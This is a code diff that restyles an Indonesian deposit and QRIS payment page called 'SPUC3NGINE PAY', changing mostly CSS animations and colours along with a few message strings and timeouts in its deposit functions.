@@ -20,25 +20,29 @@
   document.head.innerHTML = `
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>SPUC3NGINE PAY - Premium Gateway</title>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Rajdhani:wght@500;600;700&display=swap" rel="stylesheet">
+    <title>SPUC3NGINE PAY - ProMax Edition</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;800;900&family=Rajdhani:wght@600;700&display=swap" rel="stylesheet">
     <style>
       :root {
-        --bg-main: #03050d;
-        --bg-card: rgba(10, 15, 30, 0.8);
+        --bg-main: #020208;
+        --bg-card: rgba(6, 10, 26, 0.7);
         --primary: #00f0ff;
-        --secondary: #bd00ff;
+        --secondary: #ff007f;
         --success: #00ffcc;
-        --text: #f1f5f9;
-        --border: rgba(0, 240, 255, 0.25);
-        --glow: 0 0 15px rgba(0, 240, 255, 0.4);
+        --border: rgba(0, 240, 255, 0.3);
+        --neon-shadow: 0 0 20px rgba(0, 240, 255, 0.5);
       }
 
       body {
         margin: 0;
         font-family: 'Rajdhani', sans-serif;
-        background: radial-gradient(circle at 50% 50%, #0d122b 0%, var(--bg-main) 100%);
-        color: var(--text);
+        background-color: var(--bg-main);
+        background-image: 
+          linear-gradient(rgba(0, 240, 255, 0.03) 1px, transparent 1px),
+          linear-gradient(90deg, rgba(0, 240, 255, 0.03) 1px, transparent 1px);
+        background-size: 20px 20px;
+        background-position: center;
+        color: #f1f5f9;
         display: flex;
         justify-content: center;
         align-items: center;
@@ -46,94 +50,96 @@
         padding: 20px 0;
         box-sizing: border-box;
         overflow-x: hidden;
+        animation: bgScroll 20s linear infinite;
       }
 
-      /* Animated Background Cyber Elements */
-      body::before {
-        content: "";
-        position: fixed;
-        top: 0; left: 0; width: 100%; height: 100%;
-        background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
-        background-size: 100% 4px, 6px 100%;
-        z-index: 0;
-        pointer-events: none;
+      /* Animasi Background Bergerak */
+      @keyframes bgScroll {
+        from { background-position: 0 0; }
+        to { background-position: 40px 40px; }
       }
 
       .container {
         max-width: 460px;
         width: 92%;
         background: var(--bg-card);
-        backdrop-filter: blur(20px);
-        -webkit-backdrop-filter: blur(20px);
-        border-radius: 28px;
-        border: 1px solid var(--border);
-        box-shadow: 0 0 50px rgba(0, 240, 255, 0.15), inset 0 0 30px rgba(189, 0, 255, 0.1);
-        padding: 35px 28px;
+        backdrop-filter: blur(25px);
+        -webkit-backdrop-filter: blur(25px);
+        border-radius: 32px;
+        border: 2px solid var(--border);
+        box-shadow: 0 0 60px rgba(0, 240, 255, 0.15), inset 0 0 35px rgba(255, 0, 127, 0.15);
+        padding: 40px 30px;
         display: flex;
         flex-direction: column;
         align-items: center;
         position: relative;
-        z-index: 1;
-        animation: cyberEntrance 0.7s cubic-bezier(0.16, 1, 0.3, 1);
+        box-sizing: border-box;
+        animation: promaxEntrance 0.8s cubic-bezier(0.34, 1.56, 0.64, 1);
       }
 
-      @keyframes cyberEntrance {
-        from { opacity: 0; transform: scale(0.95) translateY(30px); filter: blur(5px); }
-        to { opacity: 1; transform: scale(1) translateY(0); filter: blur(0); }
+      @keyframes promaxEntrance {
+        0% { opacity: 0; transform: scale(0.8) rotate(-2deg); filter: blur(10px); }
+        100% { opacity: 1; transform: scale(1) rotate(0deg); filter: blur(0); }
+      }
+
+      /* Glow effect di sekeliling container */
+      .container::before {
+        content: ''; position: absolute; top: -2px; left: -2px; right: -2px; bottom: -2px;
+        background: linear-gradient(45deg, var(--primary), transparent, var(--secondary), transparent);
+        border-radius: 32px; z-index: -1; opacity: 0.4; pointer-events: none;
       }
 
       .logo-area {
         font-family: 'Orbitron', sans-serif;
-        font-size: 28px;
+        font-size: 32px;
         font-weight: 900;
         text-align: center;
-        letter-spacing: 3px;
+        letter-spacing: 4px;
         background: linear-gradient(90deg, var(--primary), #fff, var(--secondary));
         -webkit-background-clip: text;
         -webkit-text-fill-color: transparent;
-        filter: drop-shadow(0 0 12px rgba(0, 240, 255, 0.5));
         margin-bottom: 2px;
-        animation: pulseGlow 3s ease-in-out infinite;
+        filter: drop-shadow(0 0 15px rgba(0, 240, 255, 0.6));
+        animation: logoGlitch 4s infinite alternate;
       }
 
-      @keyframes pulseGlow {
-        0%, 100% { filter: drop-shadow(0 0 12px rgba(0, 240, 255, 0.4)); }
-        50% { filter: drop-shadow(0 0 20px rgba(189, 0, 255, 0.6)); }
+      @keyframes logoGlitch {
+        0%, 100% { transform: skew(0deg); filter: drop-shadow(0 0 15px rgba(0, 240, 255, 0.6)); }
+        4% { transform: skew(-5deg); filter: drop-shadow(2px 0 var(--secondary)); }
+        7% { transform: skew(5deg); }
+        10% { transform: skew(0deg); }
       }
 
       .subtitle {
         font-size: 13px;
         color: #94a3b8;
-        letter-spacing: 6px;
+        letter-spacing: 8px;
         text-transform: uppercase;
-        margin-bottom: 24px;
+        margin-bottom: 28px;
         font-weight: 700;
-        position: relative;
-      }
-
-      .subtitle::after {
-        content: ""; position: absolute; bottom: -6px; left: 25%; width: 50%; height: 1px; background: linear-gradient(90deg, transparent, var(--primary), transparent);
+        opacity: 0.8;
       }
 
       .marquee {
         width: 100%;
         overflow: hidden;
         white-space: nowrap;
-        background: rgba(251, 191, 36, 0.04);
-        border: 1px solid rgba(251, 191, 36, 0.2);
-        border-radius: 10px;
-        padding: 10px;
+        background: rgba(251, 191, 36, 0.03);
+        border: 1px solid rgba(251, 191, 36, 0.25);
+        border-radius: 12px;
+        padding: 12px;
         color: #fbbf24;
-        margin-bottom: 24px;
+        margin-bottom: 28px;
         font-size: 13px;
         box-sizing: border-box;
         font-weight: 600;
+        box-shadow: inset 0 0 10px rgba(251, 191, 36, 0.05);
       }
 
       .marquee span {
         display: inline-block;
         padding-left: 100%;
-        animation: marquee 22s linear infinite;
+        animation: marquee 20s linear infinite;
       }
 
       @keyframes marquee {
@@ -144,101 +150,108 @@
       .actions {
         display: grid;
         grid-template-columns: 1fr 1fr;
-        gap: 12px;
+        gap: 14px;
         width: 100%;
-        margin-bottom: 24px;
+        margin-bottom: 28px;
       }
 
       button {
         width: 100%;
-        background: linear-gradient(135deg, #0096c7, var(--primary));
-        color: #03050d;
-        border: 1px solid rgba(0, 240, 255, 0.3);
-        padding: 14px 18px;
-        border-radius: 14px;
+        background: linear-gradient(135deg, #00b4d8, var(--primary));
+        color: #020208;
+        border: none;
+        padding: 15px 20px;
+        border-radius: 16px;
         font-family: 'Rajdhani', sans-serif;
         font-size: 16px;
         font-weight: 700;
         text-transform: uppercase;
         cursor: pointer;
-        transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
-        box-shadow: var(--glow);
+        transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        box-shadow: var(--neon-shadow);
         letter-spacing: 1px;
+        position: relative;
+        overflow: hidden;
       }
 
+      button::after {
+        content: ''; position: absolute; top: 0; left: -50%; width: 200%; height: 100%;
+        background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+        transform: skewX(-20deg); transition: 0.75s; opacity: 0;
+      }
+
+      button:hover::after { left: 120%; opacity: 1; }
+
       button:hover {
-        transform: translateY(-3px);
-        box-shadow: 0 0 25px rgba(0, 240, 255, 0.6);
-        background: linear-gradient(135deg, var(--primary), #e0f7fa);
+        transform: translateY(-4px) scale(1.02);
+        box-shadow: 0 0 30px rgba(0, 240, 255, 0.8);
       }
 
       button.secondary {
-        background: linear-gradient(135deg, var(--secondary), #7b2cbf);
+        background: linear-gradient(135deg, var(--secondary), #b50056);
         color: #fff;
-        border: 1px solid rgba(189, 0, 255, 0.3);
-        box-shadow: 0 0 15px rgba(189, 0, 255, 0.3);
+        box-shadow: 0 0 20px rgba(255, 0, 127, 0.4);
       }
       button.secondary:hover {
-        box-shadow: 0 0 25px rgba(189, 0, 255, 0.6);
-        background: linear-gradient(135deg, #d857ff, var(--secondary));
+        box-shadow: 0 0 35px rgba(255, 0, 127, 0.8);
       }
 
       button.help {
         grid-column: span 2;
-        background: rgba(255, 255, 255, 0.03) !important;
-        border: 1px dashed rgba(255, 255, 255, 0.15) !important;
-        color: #94a3b8 !important;
+        background: rgba(255, 255, 255, 0.02) !important;
+        border: 1px dashed rgba(0, 240, 255, 0.3) !important;
+        color: var(--primary) !important;
         box-shadow: none !important;
         margin-top: 4px;
       }
       button.help:hover {
-        background: rgba(255, 255, 255, 0.07) !important;
-        color: #fff !important;
+        background: rgba(0, 240, 255, 0.08) !important;
         border-style: solid !important;
-        border-color: rgba(255,255,255,0.4) !important;
+        box-shadow: var(--neon-shadow) !important;
       }
 
       select, input {
         width: 100%;
-        padding: 14px 18px;
+        padding: 15px 20px;
         border: 1px solid var(--border);
-        border-radius: 14px;
+        border-radius: 16px;
         font-size: 16px;
-        background: #060919;
+        background: #040714;
         color: #fff;
         font-family: 'Rajdhani', sans-serif;
         font-weight: 600;
         box-sizing: border-box;
-        transition: all 0.3s ease;
-        margin-bottom: 14px;
+        transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+        margin-bottom: 16px;
       }
 
       select:focus, input:focus {
         outline: none;
         border-color: var(--primary);
-        box-shadow: 0 0 15px rgba(0, 240, 255, 0.3);
-        background: #0a0e26;
+        box-shadow: 0 0 20px rgba(0, 240, 255, 0.4);
+        background: #080d26;
       }
 
       .content-panel {
         width: 100%;
-        animation: panelSlide 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+        animation: promaxPanelIn 0.5s cubic-bezier(0.16, 1, 0.3, 1);
       }
 
-      @keyframes panelSlide {
-        from { opacity: 0; transform: translateY(15px); filter: blur(2px); }
-        to { opacity: 1; transform: translateY(0); filter: blur(0); }
+      @keyframes promaxPanelIn {
+        from { opacity: 0; transform: scale(0.96) translateY(20px); filter: blur(4px); }
+        to { opacity: 1; transform: scale(1) translateY(0); filter: blur(0); }
       }
 
       .bank-info {
-        background: rgba(5, 8, 22, 0.7);
-        padding: 20px;
-        border-radius: 18px;
-        border: 1px solid rgba(189, 0, 255, 0.2);
+        background: rgba(4, 7, 20, 0.8);
+        padding: 22px;
+        border-radius: 20px;
+        border: 1px solid rgba(255, 0, 127, 0.25);
         display: flex;
         flex-direction: column;
-        gap: 14px;
-        margin-bottom: 14px;
+        gap: 16px;
+        margin-bottom: 16px;
+        box-shadow: inset 0 0 15px rgba(255,0,127,0.05);
       }
 
       .bank-header {
@@ -248,121 +261,121 @@
       }
 
       .bank-info img {
-        width: 48px;
-        height: 48px;
+        width: 50px;
+        height: 50px;
         object-fit: contain;
         background: #fff;
         padding: 6px;
-        border-radius: 10px;
-        box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+        border-radius: 12px;
+        box-shadow: 0 4px 15px rgba(0,0,0,0.4);
       }
 
-      .bank-meta b { font-size: 20px; color: var(--primary); font-family: 'Orbitron', sans-serif; }
-      .bank-meta small { color: #64748b; font-size: 14px; display: block; margin-top: 2px; font-weight: 600; }
+      .bank-meta b { font-size: 22px; color: var(--primary); font-family: 'Orbitron', sans-serif; }
+      .bank-meta small { color: #64748b; font-size: 14px; display: block; margin-top: 3px; font-weight: 700; text-transform: uppercase; }
 
       .bank-number {
         display: flex;
         align-items: center;
         justify-content: space-between;
-        background: #02040a;
-        padding: 12px 16px;
-        border-radius: 12px;
+        background: #010206;
+        padding: 14px 18px;
+        border-radius: 14px;
         border: 1px solid rgba(255,255,255,0.03);
       }
 
       .bank-number span {
         font-family: 'Orbitron', sans-serif;
-        font-size: 16px;
+        font-size: 17px;
         letter-spacing: 1.5px;
         color: #fff;
-        text-shadow: 0 0 5px rgba(255,255,255,0.2);
+        text-shadow: 0 0 8px rgba(255,255,255,0.3);
       }
 
       .copy-btn {
         width: auto;
-        padding: 8px 16px;
+        padding: 8px 18px;
         font-size: 13px;
-        border-radius: 8px;
+        border-radius: 10px;
         box-shadow: none;
       }
 
-      .result-area {
-        text-align: center;
-        margin-top: 18px;
-      }
+      .result-area { text-align: center; margin-top: 20px; }
 
       .qr-card {
         background: #fff;
-        padding: 16px;
-        border-radius: 20px;
+        padding: 18px;
+        border-radius: 24px;
         display: inline-block;
-        box-shadow: 0 15px 40px rgba(0,0,0,0.6), 0 0 20px rgba(0, 240, 255, 0.2);
-      }
-      .qr-card img { width: 210px; height: 210px; display: block; }
-
-      .qr-buttons {
-        display: flex;
-        gap: 12px;
-        margin-top: 18px;
-        width: 100%;
+        box-shadow: 0 20px 50px rgba(0,0,0,0.7), 0 0 25px rgba(0, 240, 255, 0.3);
+        animation: qrPulse 2s infinite ease-in-out;
       }
       
-      .done-btn {
-        background: linear-gradient(135deg, var(--success), #00b494);
-        color: #03050d;
-        box-shadow: 0 4px 15px rgba(0, 255, 204, 0.2);
+      @keyframes qrPulse {
+        0%, 100% { box-shadow: 0 20px 50px rgba(0,0,0,0.7), 0 0 25px rgba(0, 240, 255, 0.3); }
+        50% { box-shadow: 0 20px 50px rgba(0,0,0,0.7), 0 0 40px rgba(255, 0, 127, 0.5); }
       }
-      .done-btn:hover { box-shadow: 0 0 25px rgba(0, 255, 204, 0.5); }
+      .qr-card img { width: 220px; height: 220px; display: block; border-radius: 8px; }
+
+      .qr-buttons { display: flex; gap: 14px; margin-top: 20px; width: 100%; }
+      
+      .done-btn {
+        background: linear-gradient(135deg, var(--success), #00ba9b);
+        color: #020208;
+        box-shadow: 0 4px 15px rgba(0, 255, 204, 0.3);
+      }
+      .done-btn:hover { box-shadow: 0 0 25px rgba(0, 255, 204, 0.6); }
 
       .spinner {
-        width: 44px;
-        height: 44px;
-        border: 3px solid rgba(0, 240, 255, 0.05);
-        border-top: 3px solid var(--primary);
+        width: 48px;
+        height: 48px;
+        border: 4px solid rgba(0, 240, 255, 0.05);
+        border-top: 4px solid var(--primary);
+        border-right: 4px solid var(--secondary);
         border-radius: 50%;
-        animation: spin 0.7s linear infinite;
-        margin: 25px auto;
+        animation: spin 0.6s linear infinite;
+        margin: 30px auto;
       }
       @keyframes spin { to { transform: rotate(360deg); } }
 
       .footer-img {
-        margin-top: 28px;
+        margin-top: 32px;
         text-align: center;
-        opacity: 0.3;
-        transition: opacity 0.3s;
+        opacity: 0.25;
+        transition: opacity 0.4s, filter 0.4s;
+        filter: grayscale(100%) brightness(150%);
       }
-      .footer-img:hover { opacity: 0.6; }
-      .footer-img img { max-width: 55%; filter: grayscale(100%) brightness(200%); }
+      .footer-img:hover { opacity: 0.7; filter: grayscale(0%) brightness(100%); }
+      .footer-img img { max-width: 50%; }
 
       .toast {
         position: fixed;
-        bottom: 35px;
+        bottom: 40px;
         left: 50%;
-        transform: translateX(-50%) scale(0.85);
-        min-width: 265px;
+        transform: translateX(-50%) scale(0.8);
+        min-width: 280px;
         text-align: center;
-        padding: 14px 22px;
-        border-radius: 14px;
+        padding: 15px 25px;
+        border-radius: 16px;
         font-size: 15px;
         font-weight: 700;
         opacity: 0;
         pointer-events: none;
-        transition: all 0.35s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         z-index: 9999;
         font-family: 'Rajdhani', sans-serif;
         text-transform: uppercase;
-        letter-spacing: 0.5px;
+        letter-spacing: 1px;
       }
       .toast.show { opacity: 1; transform: translateX(-50%) scale(1); }
-      .toast.success { background: var(--success); color: #03050d; box-shadow: 0 0 20px rgba(0,255,204,0.4); }
-      .toast.error { background: #ff0055; color: #fff; box-shadow: 0 0 20px rgba(255,0,85,0.4); }
+      .toast.success { background: var(--success); color: #020208; box-shadow: 0 0 25px rgba(0,255,204,0.5); }
+      .toast.error { background: var(--secondary); color: #fff; box-shadow: 0 0 25px rgba(255,0,127,0.5); }
     </style>
   `;
 
   document.body.innerHTML = `
     <div class="container">
       <div class="logo-area">SPUC3NGINE PAY</div>
-      <div class="subtitle">Secure Gateway v2</div>
+      <div class="subtitle">PROMAX GATEWAY</div>
       
       <div class="marquee">
         <span>⚠️ Deposit WAJIB sesuai nominal formulir! Transaksi pertama DIWAJIBKAN menggunakan Kode Unik (Contoh: 50.123). Jika melanggar syarat ketentuan, otomatis GAGAL PROSES.</span>
@@ -416,18 +429,16 @@
     <div id="toast" class="toast"></div>
   `;
 
-  // --- FUNGSI BARU: FORMAT RUPIAH OTOMATIS SAAT DIKETIK ---
+  // --- LOGIC AUTO THOUSAND FORMAT REALTIME ---
   window.formatRupiahEvent = function (element) {
-    let value = element.value.replace(/[^0-9]/g, ""); // Hanya ambil angka
+    let value = element.value.replace(/[^0-9]/g, "");
     if (value === "") {
       element.value = "";
       return;
     }
-    // Tambahkan titik setiap kelipatan 3 digit dari belakang
     element.value = Number(value).toLocaleString("id-ID");
   };
 
-  // Mengubah kembali string format titik menjadi angka murni untuk pengecekan validasi
   function getCleanNumber(str) {
     return Number(str.replace(/\./g, "") || 0);
   }
@@ -443,6 +454,7 @@
     const manualPanel = document.getElementById("manual-step");
     const autoPanel = document.getElementById("auto-deposit");
     
+    // Smooth dynamic reset/switch view
     manualPanel.style.display = type === "manual" ? "block" : "none";
     autoPanel.style.display = type === "auto" ? "block" : "none";
   };
@@ -466,19 +478,19 @@
 
   window.submitManualDeposit = function () {
     const rawVal = document.getElementById("manual-nominal").value;
-    const n = getCleanNumber(rawVal); // Bersihkan titik sebelum validasi angka
+    const n = getCleanNumber(rawVal);
     
     if (n < 50000) return showToast("Minimal deposit Rp 50.000", "error");
     document.getElementById("manual-result").innerHTML = '<div class="spinner"></div>';
     setTimeout(() => {
-      document.getElementById("manual-result").innerHTML = "<div style='color:var(--success); font-weight:700; margin-top:12px; font-size:16px;'>✓ DEPOSIT SEDANG DIPROSES SYSTEM</div>";
+      document.getElementById("manual-result").innerHTML = "<div style='color:var(--success); font-weight:700; margin-top:14px; font-size:18px; letter-spacing:0.5px;'>✓ SYSTEM: DEPOSIT DIPROSES</div>";
       setTimeout(() => history.back(), 1500);
     }, 1500);
   };
 
   window.generateQRIS = function () {
     const rawVal = document.getElementById("nominal").value;
-    const n = getCleanNumber(rawVal); // Bersihkan titik sebelum validasi angka
+    const n = getCleanNumber(rawVal);
     
     if (n < 50000) return showToast("Minimal Rp 50.000", "error");
     document.getElementById("auto-result").innerHTML = '<div class="spinner"></div>';
@@ -487,15 +499,15 @@
 
     setTimeout(() => {
       document.getElementById("auto-result").innerHTML = `
-        <div class="qr-card" style="animation: panelSlide 0.4s ease;">
+        <div class="qr-card" style="animation: promaxPanelIn 0.5s ease;">
           <img id="qris-img" src="${qrUrl}" alt="QRIS">
         </div>
         <div class="qr-buttons">
-          <button style="background:#3b82f6; color:#fff; border-color: rgba(59,130,246,0.5); box-shadow:0 0 15px rgba(59,130,246,0.3)" onclick="downloadQRIS()">Unduh QRIS</button>
-          <button class="done-btn" onclick="history.back()">Saya Sudah Bayar</button>
+          <button style="background:#3b82f6; color:#fff; box-shadow:0 0 15px rgba(59,130,246,0.4)" onclick="downloadQRIS()">Unduh QRIS</button>
+          <button class="done-btn" onclick="history.back()">Sudah Membayar</button>
         </div>
       `;
-    }, 1000);
+    }, 1200);
   };
 
   window.downloadQRIS = function () {
